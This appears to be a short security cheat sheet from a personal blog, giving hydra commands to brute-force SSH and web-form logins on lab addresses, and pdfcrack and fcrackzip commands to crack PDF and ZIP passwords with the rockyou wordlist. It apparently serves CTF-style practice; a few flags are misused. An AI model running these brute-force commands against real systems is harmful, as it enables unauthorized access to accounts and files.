---
title: "[Services] Basic login crack tools"
published: 2024-04-12
description: 'Crack login service or file through brute force'
tags: [Security, Buster, Services]
category: Buster
draft: false
---

# [Services] hydra

Tools for guess login to `services` like `SSH`, `FTP` and `RDP`

## Avaiable wordlists
- `/usr/share/wordlists/metasploit`
- `/usr/share/wordlists/rockyou.txt` for username

## Basic usage
```bash
hydra -l <username> -p <password> <server> <service>
```

### Guess the username to linux machine
```bash
hydra -L users.txt -p butterfly 10.10.137.76 ssh
```

### Guess the `username` to linux machine
```bash
hydra -L users.txt -p butterfly 10.10.137.76 ssh
```

### Guess the `password` to linux machine
- Using `rockyou.txt` as password
```bash
hydra -l root -p /usr/share/wordlists/rockyou.txt 10.10.137.76 ssh
```

### Specific threads
- Guess the `password` to linux machine, and specific the number of threads to 4
```bash
hydra -l root -p /usr/share/wordlists/rockyou.txt 10.10.137.76 -t 4 ssh
```

### Specific HTTP post
- With action = `/login` POST, and the input name is `username` and `password`.  
- Tell it's wrong if `Your username or password is incorrect.` appares on the website.  

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    10.10.156.82 http-post-form \
    "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
```

### Guess ssh
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.156.82 -t 4 ssh
```


# [PDF] pdfcrack
PDFCrack is a simple tool for recovering passwords from pdf-documents.

```bash
pdfcrack -f <file_name>
```

```bash
pdfcrack -f <file_name> -w <location_of_wordlist_file>
pdfcrack -f <file_name> -w /usr/share/wordlists/rockyou.txt
```

# [ZIP] Fcrackzip 
Fcrackzip is a password cracking tool for ZIP files.  
Fcrackzip cracks the password by Brute-Force Attack or by a Dictionary Attack.  

```bash
fcrackzip -v -b -u <file_name.zip>
```

```bash
fcrackzip -v -u -D -p <path_to_wordlist_file> <file_name.zip>

fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt <file_name.zip>
```